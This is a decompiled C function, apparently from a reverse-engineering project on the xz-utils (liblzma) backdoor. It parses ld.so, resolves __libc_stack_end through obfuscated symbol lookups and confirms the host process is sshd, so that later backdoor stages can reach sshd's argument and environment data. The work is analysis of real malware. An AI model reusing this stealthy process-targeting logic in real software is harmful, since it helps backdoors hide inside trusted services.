// /home/kali/xzre-ghidra/xzregh/103CE0_main_elf_parse.c
// Function: main_elf_parse @ 0x103CE0
// Calling convention: unknown
// Prototype: undefined main_elf_parse(void)


/*
 * AutoDoc: Given a `main_elf_t` that already points at ld.so's ELF header, this routine parses the interpreter, looks up `__libc_stack_end`, and then calls `process_is_sshd` to verify that the captured runtime really belongs to sshd. If the checks pass it stores the resolved `__libc_stack_end` pointer back through `main_elf->__libc_stack_end`, giving later stages an easy way to reach sshd's argument/environment block.
 */
#include "xzre_types.h"


undefined1  [16]
main_elf_parse(long *param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  int iVar1;
  long lVar2;
  undefined8 uVar3;
  undefined8 *puVar4;
  undefined1 auVar5 [16];
  void **libc_stack_end_ptr;
  Elf64_Sym *libc_stack_end_sym;
  
  iVar1 = elf_parse(param_1[1],*(undefined8 *)(*param_1 + 8));
  if (iVar1 != 0) {
    lVar2 = elf_symbol_get(*(undefined8 *)(*param_1 + 8),0x2b0,0x8c0);
    if (lVar2 != 0) {
      puVar4 = (undefined8 *)(*(long *)(lVar2 + 8) + **(long **)(*param_1 + 8));
      iVar1 = process_is_sshd(*(long **)(*param_1 + 8),*puVar4);
      if (iVar1 != 0) {
        *(undefined8 *)param_1[2] = *puVar4;
        uVar3 = 1;
        goto LAB_00103d49;
      }
    }
  }
  uVar3 = 0;
LAB_00103d49:
  auVar5._8_8_ = param_4;
  auVar5._0_8_ = uVar3;
  return auVar5;
}

